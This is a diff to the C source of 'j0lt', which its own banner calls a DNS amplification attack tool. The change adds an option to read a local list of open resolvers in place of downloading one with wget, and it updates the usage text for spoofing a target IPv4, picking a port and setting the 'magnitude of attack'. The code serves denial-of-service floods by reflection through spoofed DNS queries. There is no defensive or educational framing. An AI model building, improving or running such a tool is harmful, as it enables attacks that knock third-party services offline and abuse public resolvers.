@@ -13,15 +13,17 @@
  * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
  * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
  * ------------------------------------------------------------
+ * Options:
+ * [-x] will print a hexdump of the packet headers
+ * [-d] puts j0lt into debug mode, no packets are sent
+ * [-r list] will not fetch a resolv list, if one is provided.
+ * ------------------------------------------------------------
  * Shouts to the only sane place left on the internet
  * irc.efnet.org #c
  */
 
- // TODO: 3) store resolver list in memory file access to slow. 
- // TODO: 4) clean up code
-
 const char* g_ansi = {
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
+    " the-scientist@rootstorm.com ░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
     "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
     "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
     "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
@@ -51,22 +53,21 @@ const char* g_ansi = {
     " ▓▓▓▓▓▓▓      ░ ▓▓       ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░░░░░░\n"
     "░░▓▓▓▓▓  ░░░░░░░░      ▓▓ ░      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
     "░░░░░░░░░░░░░░░░                ░░░░░░░              ░░░░░                 \n"
-    "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
-    "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
-    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-t <target>        : target IPv4 (spoof) \n"
-    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>          : target port         \n"
-    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>     : magnitude of attack \n"
-    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░ -x [hexdump]       : print hexdump       \n"
-    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░ -d [debug]         : offline debug mode  \n"
-    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
-    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
-    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
-    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
-    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
-    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
-    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
+    "░░░░░░░░░░░░░░░         ▓░░░░░░░                                           \n"
+    "░░░░░░░░░░░░░░        ░ ░░░░░░░░ Usage: sudo ./j0lt -t -p -m [OPTION]...   \n"
+    "░░░░░░░░░░░░░        ░░░░░░░░░░░ -t <target>      : target IPv4 (spoof)    \n"
+    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░ -p <port>        : target port            \n"
+    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░ -m <magnitude>   : magnitude of attack    \n"
+    "░░░░░░░░░       ░░░░░░░░░░░░░░░░ -x [hexdump]     : print hexdump          \n"
+    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░ -d [debug]       : offline debug mode     \n"
+    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░ -r [resolv]<path>: will not download list \n"
+    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░                  : provide absolute path  \n"
+    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░                                           \n"
+    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░ w3lc0m3 t0 j0lt                           \n"
+    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░ a DNS amplification attack tool           \n"
+    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░                               spl0its-r-us\n"
+    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                the-scientist@rootstorm.com\n"
 };
-
 #include <stdbool.h>
 #include <stddef.h>
 #include <stdint.h>
@@ -236,8 +237,9 @@ int
 main(int argc, char** argv)
 {
     FILE* fptr;
-    char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
-    int status, i, opt, s, debugmode, hexmode;
+    char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ], resolvpath[ PATH_MAX ];
+    char* pathptr;
+    int status, i, opt, s, debugmode, hexmode, filereadmode, pathsz;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, magnitude;
@@ -254,9 +256,9 @@ main(int argc, char** argv)
     printf("%s", g_ansi);
     printf("argc: %d\n", argc);
 
-    debugmode = hexmode = 0;
+    filereadmode = debugmode = hexmode = 0;
     magnitude = spoofport = spoofip = -1;
-    opt = getopt(argc, argv, "t:p:m:hd");
+    opt = getopt(argc, argv, "t:p:m:r:hd");
     do {
         switch (opt) {
         case 't':
@@ -278,6 +280,16 @@ main(int argc, char** argv)
             if (errno != 0)
                 err_exit("* magnituted invalid");
             break;
+        case 'r':
+            while (*optarg == ' ')
+                optarg++;
+            filereadmode = 1;
+            pathsz = strlen(optarg);
+            if (pathsz > PATH_MAX - 1)
+                err_exit("* path size invalid");
+            memcpy(resolvpath, optarg, pathsz);
+            pathptr = resolvpath;
+            break;
         case 'h':
             hexmode = 1;
             break;
@@ -286,56 +298,50 @@ main(int argc, char** argv)
             break;
         case -1:
         default: /* '?' */
-            err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
+            err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
         }
     } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
 
     if (magnitude == -1 || spoofport == -1 || spoofip == -1)
-        err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
+        err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
 
-    s = posix_spawnattr_init(&attr);
-    if (s != 0)
-        err_exit("* posix_spawnattr_init");
-    s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
-    if (s != 0)
-        err_exit("* posix_spawnattr_setflags");
-
-    sigfillset(&mask);
-    s = posix_spawnattr_setsigmask(&attr, &mask);
-    if (s != 0)
-        err_exit("* posix_spawnattr_setsigmask");
-
-    attrp = &attr;
-
-    s = posix_spawnp(&child_pid, g_wget[ 0 ], file_actionsp, attrp, &g_wget[ 0 ], environ);
-    if (s != 0)
-        err_exit("* posix_spawn");
-
-    if (attrp != NULL) {
-        s = posix_spawnattr_destroy(attrp);
+    if (filereadmode == 0) {
+        pathptr = g_path;
+        s = posix_spawnattr_init(&attr);
         if (s != 0)
-            err_exit("* posix_spawnattr_destroy");
-    }
-
-    if (file_actionsp != NULL) {
-        s = posix_spawn_file_actions_destroy(file_actionsp);
+            err_exit("* posix_spawnattr_init");
+        s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
         if (s != 0)
-            err_exit("* posix_spawn_file_actions_destroy");
+            err_exit("* posix_spawnattr_setflags");
+
+        sigfillset(&mask);
+        s = posix_spawnattr_setsigmask(&attr, &mask);
+        if (s != 0)
+            err_exit("* posix_spawnattr_setsigmask");
+
+        attrp = &attr;
+
+        s = posix_spawnp(&child_pid, g_wget[ 0 ], file_actionsp, attrp, &g_wget[ 0 ], environ);
+        if (s != 0)
+            err_exit("* posix_spawn");
+
+        if (attrp != NULL) {
+            s = posix_spawnattr_destroy(attrp);
+            if (s != 0)
+                err_exit("* posix_spawnattr_destroy");
+        }
+
+        if (file_actionsp != NULL) {
+            s = posix_spawn_file_actions_destroy(file_actionsp);
+            if (s != 0)
+                err_exit("* posix_spawn_file_actions_destroy");
+        }
+        do {
+            s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
+            if (s == -1)
+                err_exit("* waitpid");
+        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
     }
-
-    printf("+ Child spawned at PID : %jd\n", ( intmax_t ) child_pid);
-
-    do {
-        s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
-        if (s == -1)
-            err_exit("* waitpid");
-
-        printf("- Child status: ");
-        if (WIFEXITED(status))
-            printf("exited, status=%d\n", WEXITSTATUS(status));
-        else if (WIFCONTINUED(status))
-            printf("continued\n");
-    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
 
     fptr = fopen(g_path, "r");
     if (fptr == NULL)
